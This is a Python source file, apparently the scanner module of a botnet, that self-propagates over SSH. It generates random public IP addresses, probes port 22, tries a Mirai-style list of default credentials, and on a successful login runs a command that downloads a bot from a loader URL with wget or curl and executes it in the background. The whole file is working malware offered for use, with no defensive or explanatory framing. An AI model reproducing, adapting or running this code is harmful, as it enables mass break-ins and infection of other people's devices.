# bot/scanner.py

import socket
import threading
import paramiko
import time

# --- Global State ---
stop_scanner_event = threading.Event()
scanner_thread = None

# --- Common Credentials ---
# A short list inspired by Mirai's default credentials
CREDENTIALS = [
    ("root", "root"),
    ("admin", "admin"),
    ("root", "password"),
    ("user", "user"),
    ("guest", "guest"),
    ("support", "support"),
    ("pi", "raspberry"),
    ("admin", "1234"),
    ("root", "123456"),
]

# --- Scanner Core ---

def get_random_ip():
    """Generates a random, non-private IP address."""
    while True:
        # Generate a random 32-bit integer
        ip_int = random.randint(1, 0xFFFFFFFF)
        
        # Convert to dot-decimal notation
        o1 = (ip_int >> 24) & 0xFF
        o2 = (ip_int >> 16) & 0xFF
        o3 = (ip_int >> 8) & 0xFF
        o4 = ip_int & 0xFF
        
        # Skip private and reserved IP ranges
        if o1 == 10: continue
        if o1 == 127: continue
        if o1 == 172 and 16 <= o2 <= 31: continue
        if o1 == 192 and o2 == 168: continue
        if o1 >= 224: continue # Multicast/Reserved
        
        return f"{o1}.{o2}.{o3}.{o4}"

def try_ssh_login(ip, port, loader_url):
    """Attempts to log in to a device via SSH using common credentials."""
    for user, password in CREDENTIALS:
        if stop_scanner_event.is_set():
            return
            
        try:
            ssh = paramiko.SSHClient()
            # Automatically add host key, which is insecure but necessary for this purpose
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=port, username=user, password=password, timeout=5)
            
            print(f"[+] SUCCESS: Logged into {ip}:{port} with {user}:{password}")
            
            # --- INFECTION PAYLOAD ---
            # Command to download and execute the bot.
            # It tries wget first, then curl. The output is redirected to /dev/null
            # to hide the command, and it's run in the background.
            cmd_to_exec = (
                f"(wget -O /tmp/y.py {loader_url} || curl -o /tmp/y.py {loader_url}) && "
                f"python3 /tmp/y.py &"
            )
            
            stdin, stdout, stderr = ssh.exec_command(cmd_to_exec)
            
            # Optional: check stderr to see if the command failed
            # error_output = stderr.read().decode()
            
            ssh.close()
            print(f"[*] Infection payload delivered to {ip}")
            return # Move on to the next IP after successful infection
            
        except paramiko.AuthenticationException:
            # This is expected, just means wrong credentials
            continue
        except Exception:
            # Any other error (e.g., connection refused, timeout), stop trying this IP
            break

def scan_worker(loader_url):
    """A single worker thread that continuously scans random IPs."""
    while not stop_scanner_event.is_set():
        ip = get_random_ip()
        
        # Scan for open SSH port (22)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(2)
            if sock.connect_ex((ip, 22)) == 0:
                print(f"[*] Found potential victim with open SSH port: {ip}")
                try_ssh_login(ip, 22, loader_url)

        time.sleep(0.1) # Small delay to avoid overwhelming the system

# --- Control Functions ---
def start_scanner(loader_url, num_threads=50):
    """Starts the scanning and infection process."""
    global scanner_thread, stop_scanner_event
    
    if scanner_thread and scanner_thread.is_alive():
        print("[!] Scanner is already running.")
        return
        
    stop_scanner_event.clear()
    
    # We use a single control thread that manages multiple worker threads
    def manager():
        threads = []
        for _ in range(num_threads):
            if stop_scanner_event.is_set():
                break
            t = threading.Thread(target=scan_worker, args=(loader_url,), daemon=True)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join() # Wait for threads to finish if stop is called

    scanner_thread = threading.Thread(target=manager, daemon=True)
    scanner_thread.start()
    print(f"[*] Scanner started with {num_threads} threads.")

def stop_scanner():
    """Stops the scanning process."""
    global stop_scanner_event
    if scanner_thread and scanner_thread.is_alive():
        print("[*] Sending stop signal to scanner.")
        stop_scanner_event.set()
        scanner_thread.join(timeout=5) # Wait for the thread to finish
        print("[*] Scanner stopped.")
    else:

        print("[!] Scanner is not currently running.")
import random
